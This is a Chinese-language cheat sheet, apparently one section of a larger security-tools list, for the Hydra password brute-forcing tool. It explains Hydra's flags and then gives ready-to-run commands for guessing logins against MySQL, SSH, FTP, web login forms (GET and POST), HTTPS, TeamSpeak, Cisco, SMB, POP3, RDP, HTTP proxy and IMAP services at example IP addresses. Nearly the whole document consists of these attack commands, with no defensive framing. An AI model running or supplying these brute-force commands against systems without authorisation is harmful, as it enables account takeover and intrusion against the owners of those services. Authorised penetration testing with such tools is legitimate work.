## 34. hydra
#hydra

```shell
-R #根据上一次进度继续破解
-S #使用SSL协议连接
-s #指定端口
-l #指定用户名
-L #指定用户名字典(文件)
-p #指定密码破解
-P #指定密码字典(文件)
-e #空密码探测和指定用户密码探测(ns)
-C #用户名可以用:分割(username:password)可以代替-l username -p password
-o #输出文件
-M #文件
-t #指定多线程数量，默认为16个线程
-x #最小值：MAX：CHARSET +，|
-C #文件 [，ID：密码]

hydra -L ./username.txt -P ./password.txt -t 2 -e n -f -s 3306 -v 192.168.22.128 mysql

1、破解ssh： 
hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns ip ssh 
hydra -l 用户名 -p 密码字典 -t 线程 -o save.log -vV ip ssh 
 
2、破解ftp： 
hydra ip ftp -l 用户名 -P 密码字典 -t 线程(默认16) -vV 
hydra ip ftp -l 用户名 -P 密码字典 -e ns -vV 
 
3、get方式提交，破解web登录： 
hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns ip http-get /admin/ 
hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns -f ip http-get /admin/index.php
 
4、post方式提交，破解web登录： 
hydra -l 用户名 -P 密码字典 -s 80 ip http-post-form "/admin/login.php:username=^USER^&password=^PASS^&submit=login:sorry password" 
hydra -t 3 -l admin -P pass.txt -o out.txt -f 10.36.16.18 http-post-form "login.php:id=^USER^&passwd=^PASS^:<title>wrong username or password</title>" 
（参数说明：-t同时线程数3，-l用户名是admin，字典pass.txt，保存为out.txt，-f 当破解了一个密码就停止， 10.36.16.18目标ip，http-post-form表示破解是采用http的post方式提交的表单密码破解,<title>中 的内容是表示错误猜解的返回信息提示。） 

5、破解https： 
hydra -m /index.php -l muts -P pass.txt 10.36.16.18 https 
 
6、破解teamspeak： 
hydra -l 用户名 -P 密码字典 -s 端口号 -vV ip teamspeak 
 
7、破解cisco： 
hydra -P pass.txt 10.36.16.18 cisco 
hydra -m cloud -P pass.txt 10.36.16.18 cisco-enable 
 
8、破解smb： 
hydra -l administrator -P pass.txt 10.36.16.18 smb 
  
9、破解pop3： 
hydra -l muts -P pass.txt my.pop3.mail pop3 
 
10、破解rdp： 
hydra ip rdp -l administrator -P pass.txt -V 
 
11、破解http-proxy： 
hydra -l admin -P pass.txt http-proxy://10.36.16.18 
 
12、破解imap： 
hydra -L user.txt -p secret 10.36.16.18 imap PLAIN 
hydra -C defaults.txt -6 imap://[fe80::2c:31ff:fe12:ac11]:143/PLAIN
```